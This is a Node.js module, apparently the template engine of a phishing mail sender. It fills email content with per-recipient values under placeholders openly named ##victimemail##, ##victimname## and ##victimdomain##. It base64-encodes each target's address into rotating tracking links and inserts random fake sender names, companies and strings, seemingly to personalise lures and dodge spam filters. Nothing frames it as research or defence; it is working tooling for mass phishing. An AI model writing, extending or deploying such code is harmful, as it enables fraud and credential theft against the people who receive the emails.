const fs = require('fs');

// Arrays to store data loaded from files
let firstNames = [];
let lastNames = [];
let companyNames = [];
let linksArray = [];
let wordsArray = [];

// Initialize index variables
let linkIndex = 0;
let wordIndex = 0;

// Function to load data from a text file into an array
function loadFromFile(fileName) {
    try {
        const data = fs.readFileSync(fileName, 'utf8');
        return data.split('\n').map(item => item.trim()).filter(item => item !== '');
    } catch (error) {
        console.error(`Error reading ${fileName}:`, error);
        return [];
    }
}

// Load data from text files into arrays when the module is required
function loadData() {
    firstNames = loadFromFile('fnames.txt');
    lastNames = loadFromFile('lnames.txt');
    companyNames = loadFromFile('companyNames.txt');
    linksArray = loadFromFile('links.txt');
    wordsArray = loadFromFile('words.txt');
}

loadData(); // Load data immediately when the module is required

// Generate a random number of specified length
function generateRandomNumber(count) {
    return Math.floor(Math.random() * Math.pow(10, count)).toString().padStart(count, '0');
}

// Generate a random string of specified length and type (lowercase or uppercase)
function generateRandomString(count, type) {
    const chars = type === 'lower' ? 'abcdefghijklmnopqrstuvwxyz' : 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let randomString = '';
    for (let i = 0; i < count; i++) {
        const randomIndex = Math.floor(Math.random() * chars.length);
        randomString += chars.charAt(randomIndex);
    }
    return randomString;
}

// Replace placeholders in content with actual values based on recipient's information
function replacePlaceholders(content, recipient) {
    if (typeof content !== 'string') {
        console.error('Content must be a string.');
        return ''; // Guard clause to handle non-string content safely
    }

    if (typeof recipient !== 'string') {
        console.warn('Recipient must be a string. Converting to string.');
        recipient = recipient.toString();
    }

    const domain = recipient.split('@')[1] || 'defaultdomain.com';
    const name = recipient.split('@')[0] || 'defaultname';
    const domainParts = domain.split('.') || ['default', 'com'];

    // Check if content contains ##link## placeholder
    let link = '';
    if (content.includes('##link##')) {
        link = getNextLink(recipient);
    }

    const placeholders = {
        '##date1##': new Date().toLocaleString('en-US', { timeZone: 'UTC' }),
        '##date##': new Date().toISOString(),
        '##date2##': new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' }),
        '##time##': getFormattedTime(true),
        '##time1##': getFormattedTime(false),
        '##time2##': getFormattedTime(true, 'GMT'),
        '##randomfname##': getRandomItemFromArray(firstNames),
        '##randomlname##': getRandomItemFromArray(lastNames),
        '##randomcompany##': getRandomItemFromArray(companyNames),
        '##victimb64email##': Buffer.from(recipient).toString('base64'),
        '##words##': getNextWord(wordsArray),
        '##victimemail##': recipient,
        '##victimname##': name.charAt(0).toUpperCase() + name.slice(1),
        '##victimdomain##': domain,
        '##victimdomain1##': domainParts[0].charAt(0).toUpperCase() + domainParts[0].slice(1),
        '##victimdomain2##': domainParts[0].toUpperCase(),
        '##victimdomain3##': `${domainParts[0].charAt(0).toUpperCase()}${domainParts[0].slice(1)}.${domainParts[1].toUpperCase()}`,
        '##victimdomain4##': domainParts[0].toLowerCase(),
        '##link##': link || '',
    };

    // Replace num(count), stringlower(count), and stringupper(count) placeholders
    content = content.replace(/##num(\d+)##/g, (_, count) => generateRandomNumber(parseInt(count)));
    content = content.replace(/##stringlower(\d+)##/g, (_, count) => generateRandomString(parseInt(count), 'lower'));
    content = content.replace(/##stringupper(\d+)##/g, (_, count) => generateRandomString(parseInt(count), 'upper'));
    content = content.replace(/##base64random(\d+)##/g, (_, count) => generateBase64RandomString(parseInt(count)));

    // Replace other placeholders
    Object.keys(placeholders).forEach(key => {
        const regex = new RegExp(key, 'g');
        content = content.replace(regex, placeholders[key]);
    });

    return content;
}

// Function to generate a base64 encoded random string of specified length
function generateBase64RandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Function to get a formatted time string
function getFormattedTime(includeSeconds, timeZone) {
    const options = { hour: '2-digit', minute: '2-digit' };
    if (includeSeconds) options.second = '2-digit';
    return new Date().toLocaleTimeString('en-US', { ...options, timeZone: timeZone || 'UTC' });
}

// Function to get a random item from an array
function getRandomItemFromArray(array) {
    return array[Math.floor(Math.random() * array.length)];
}

// Function to get the next word from an array in a circular manner
function getNextWord(array) {
    const word = array[wordIndex];
    wordIndex = (wordIndex + 1) % array.length; // Move to the next word, wrap around if needed
    return word;
}

// Function to get the next link and replace placeholders in the link template
function getNextLink(recipient) {
    if (linksArray.length === 0) {
        console.error('No links found in the linksArray.');
        return '';
    }

    const linkTemplate = linksArray[linkIndex];
    let link = linkTemplate.replace(/##victimb64email##/g, Buffer.from(recipient).toString('base64'))
                            .replace(/##victimemail##/g, recipient)
                            .replace(/##base64random(\d+)##/g, (_, count) => generateBase64RandomString(parseInt(count)));
    linkIndex = (linkIndex + 1) % linksArray.length; // Move to the next link, wrap around if needed
    return link;
}

module.exports = {
    replacePlaceholders
};
